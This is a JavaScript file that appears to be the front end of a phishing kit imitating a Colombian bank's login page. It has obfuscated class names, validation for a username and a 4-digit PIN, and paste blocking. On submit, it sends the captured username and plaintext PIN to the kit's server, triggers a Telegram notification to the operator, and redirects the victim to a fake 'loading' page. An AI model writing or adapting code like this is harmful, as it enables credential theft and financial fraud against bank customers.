const formulario = document.getElementById("formulario-login");
const userInput = document.getElementById('rb-i-353e21');
const passwordInput = document.getElementById('rb-i-88a9eb');
const userClearButton = document.querySelector('.rb-c-cd3bb1 .rb-c-e6508f');
const passwordClearButton = document.querySelector('.rb-c-4df00c .rb-c-e6508f');
const usernameHelper = document.getElementById('rb-i-d0dcac');
const continueButton = document.getElementById('rb-i-24c522');
const botonEntrar = document.getElementById("rb-i-24c522");

function getParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

const hasError = getParam('error') === '1' || getParam('error') === 'true';
const errorBox = document.getElementById('rb-i-c7c357');
if (hasError && errorBox) {
    errorBox.classList.add('show');
}
const errorCloseBtn = errorBox && errorBox.querySelector('.rb-c-3f6b37');
if (errorCloseBtn) {
    errorCloseBtn.addEventListener('click', function () {
        errorBox.classList.remove('show');
    });
}

function checkPaymentMethod() {
    if (!localStorage.getItem('paymentMethod')) {
        localStorage.setItem('paymentMethod', 'botonbcol');
    }
}

function isUserValid(value) {
    return value.length >= 7 && value.length <= 20;
}

function isClaveValid(value) {
    return value.length === 4 && /^[0-9]{4}$/.test(value);
}

function updateFieldClearButton(input, clearButton) {
    if (!input || !clearButton) return;
    const field = input.closest('.bc-form-field');
    const hasValue = input.value.length > 0;
    clearButton.hidden = !hasValue;
    if (field) {
        field.classList.toggle('rb-c-ec6a39', hasValue);
    }
}

function bindFieldClearButton(input, clearButton) {
    if (!input || !clearButton) return;

    function clearField() {
        input.value = '';
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.focus();
        updateFieldClearButton(input, clearButton);
    }

    clearButton.addEventListener('click', function (event) {
        event.preventDefault();
        clearField();
    });

    clearButton.addEventListener('keydown', function (event) {
        if (event.key === 'Enter' || event.key === ' ') {
            event.preventDefault();
            clearField();
        }
    });

    updateFieldClearButton(input, clearButton);
}

function updateContinueButton() {
    const username = userInput.value.trim();
    const clave = passwordInput.value;
    if (isUserValid(username) && isClaveValid(clave)) {
        continueButton.classList.add('valid');
        continueButton.disabled = false;
    } else {
        continueButton.classList.remove('valid');
        continueButton.disabled = true;
    }
}

function resetContinueButtonState() {
    continueButton.dataset.submitting = '0';
    continueButton.style.pointerEvents = '';
    continueButton.classList.remove('peth-btn-loading');
    continueButton.removeAttribute('aria-busy');
    continueButton.removeAttribute('data-peth-was-disabled');
    updateContinueButton();
}

window.addEventListener('pageshow', function (event) {
    if (event.persisted) {
        resetContinueButtonState();
    }
});

bindFieldClearButton(userInput, userClearButton);
bindFieldClearButton(passwordInput, passwordClearButton);

let usernameValidationTimer = null;
const USER_MIN_MSG = 'El usuario debe tener al menos 7 caracteres';
const USER_MAX_MSG = 'El usuario no debe tener más de 20 caracteres';

function hideUsernameError() {
    usernameHelper.classList.add('rb-c-2307a8');
    usernameHelper.textContent = '';
    userInput.classList.remove('rb-c-603f27');
}

function showUsernameError(message) {
    usernameHelper.textContent = message;
    usernameHelper.classList.remove('rb-c-2307a8');
    userInput.classList.add('rb-c-603f27');
}

function applyUsernameValidation(value) {
    if (value.length === 0) {
        hideUsernameError();
        return;
    }

    if (value.length > 20) {
        showUsernameError(USER_MAX_MSG);
    } else if (value.length < 7) {
        showUsernameError(USER_MIN_MSG);
    } else {
        hideUsernameError();
    }
}

userInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/[^a-zA-Z0-9]/g, '');
    e.target.value = value;

    clearTimeout(usernameValidationTimer);
    hideUsernameError();

    if (value.length > 0 && !isUserValid(value)) {
        usernameValidationTimer = setTimeout(function () {
            applyUsernameValidation(userInput.value);
        }, 600);
    }

    updateContinueButton();
    updateFieldClearButton(userInput, userClearButton);
});

hideUsernameError();

userInput.addEventListener('keypress', function (e) {
    const char = String.fromCharCode(e.which);
    if (!/[a-zA-Z0-9]/.test(char)) {
        e.preventDefault();
    }

    if (e.key === 'Enter') {
        e.preventDefault();
        const username = userInput.value.trim();
        if (isUserValid(username) && isClaveValid(passwordInput.value)) {
            continueButton.click();
        }
    }
});

passwordInput.addEventListener('input', function (e) {
    let value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
    e.target.value = value;
    updateContinueButton();
    updateFieldClearButton(passwordInput, passwordClearButton);
});

passwordInput.addEventListener('keydown', function (e) {
    if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
        e.preventDefault();
    }
});

passwordInput.addEventListener('paste', function (e) {
    e.preventDefault();
});

passwordInput.addEventListener('keypress', function (e) {
    if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
    }
});

async function registrarCliente(datosSesion) {
    window.localStorage.removeItem("sessionToken");

    const respuesta = await fetch("/api/clients", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ usuario: datosSesion.usuario, data: datosSesion }),
    });

    if (!respuesta.ok) {
        throw new Error("No se pudo registrar la sesión");
    }

    const resultado = await respuesta.json();

    const token = resultado?.data?.loading_token;

    if (typeof token !== "string" || !token) {
        throw new Error("El servidor no devolvió el identificador de esta solicitud");
    }

    window.localStorage.setItem("sessionToken", token);

    return token;
}


formulario.addEventListener("submit", async (evento) => {
    evento.preventDefault();

    // mostrarMensaje(errorGeneral, "");

    const usuario = userInput.value.trim();
    const contrasena = passwordInput.value;

    // Agrega aquí los campos no sensibles que quieras incluir en Telegram.
    const datosSesion = { usuario, contrasena };

    try {
        await conCarga(formulario, botonEntrar, "Entrando...", async () => {
            const sessionToken = await registrarCliente(datosSesion);
            await notificarInicioSesion(sessionToken);
        });

        window.location.assign("../cargando/");

    } catch (error) {
        // mostrarMensaje(errorGeneral, error.message || MENSAJE_ERROR_CONEXION);
        console.error("Error al iniciar sesión:", error.message || MENSAJE_ERROR_CONEXION);
        botonEntrar.focus();
    }
});

async function notificarInicioSesion(sessionToken) {
    const respuesta = await fetch("/api/telegram/login-notification", {
        method: "POST",
        headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ session_token: sessionToken }),
        cache: "no-store",
    });

    const resultado = await respuesta.json();
    if (!respuesta.ok || resultado?.ok !== true) {
        throw new Error(resultado?.message || "No se pudo enviar la notificación a Telegram.");
    }
}


